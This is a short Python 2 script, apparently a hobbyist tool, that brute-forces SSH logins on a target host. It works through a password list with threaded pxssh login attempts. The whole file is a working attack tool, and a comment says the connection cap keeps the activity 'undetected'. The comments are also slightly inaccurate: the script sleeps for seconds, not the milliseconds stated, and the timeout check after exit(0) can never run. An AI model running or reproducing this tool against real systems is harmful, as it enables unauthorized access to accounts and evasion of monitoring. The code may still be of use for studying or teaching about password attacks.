#code for bruteforcing ssh
#coded by -> payload

#Note:- Program usage
# python sshbruteforce.py -H x.x.x.x -U user_name -F password_dictionary.py(example name)


import optparse
from pexpect import pxssh
import time
from threading import *

maxconn=5  #for establishing max connection
conn_lock=BoundedSemaphore(maxconn) #created bounded semaphore , which create thread till maxconn=5 hence the work goes 
					#undetected
Found=False 
Fails=0

def conn(host,user,password,release):
	global Found
	global Fails

	try:
		s=pxssh.pxssh()
		s.login(host,user,password)	#the password checking is done here
		print "[!]Password Found[!]:"+str(password) #displaying found passwd
		Found=True   				# raising flag to "true"

	except Exception, e:  				#handeling the errors|exception raised in program
		if 'read_nonblocking' in str(e):       
			Fails +=1  
			time.sleep(5)                   #waitig for 5ms if read_nonblocking state occures
			conn(host,user,password,False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)			#waiting for 1ms to get the prompt
			conn(host,user,password,False)	#again calling the conn() with parameters
	
	finally:
		if release: conn_lock.release()

def main():
	parser=optparse.OptionParser('Program Usage -H <target host> -U <username> -F <password list>')
	parser.add_option('-H',dest='tgtip',type='string',help='Specify target ip')
	parser.add_option('-U',dest='user',type='string',help='Specify user name')
	parser.add_option('-F',dest='filename',type='string',help='Specify file path')

	(options,args)=parser.parse_args()
	user=options.user
	tgtip=options.tgtip
	filename=options.filename		
	
	if(user==None or tgtip==None or filename==None):
		print parser.usage
		exit(0)
	
	fdata=open(filename,'r')
	line=fdata.readline()
	while line:
		password=line.strip()  #read the file line by line and store it in variable password
		if Found:
			print "[*] Exiting: Password Found"
			exit(0)
			if Fails > 5:
				print "[!] Exiting: Too Many Socket Timeouts"
				exit(0)
		conn_lock.acquire()
		print "[-] Testing: "+str(password)
		t=Thread(target=conn,args=(tgtip,user,password,True))	#defined thread for faster execution of program
		child=t.start()						#started thread
		line=fdata.readline()			#used to get another line from password file as its in while loop utill EOF
if __name__=='__main__':
	main()
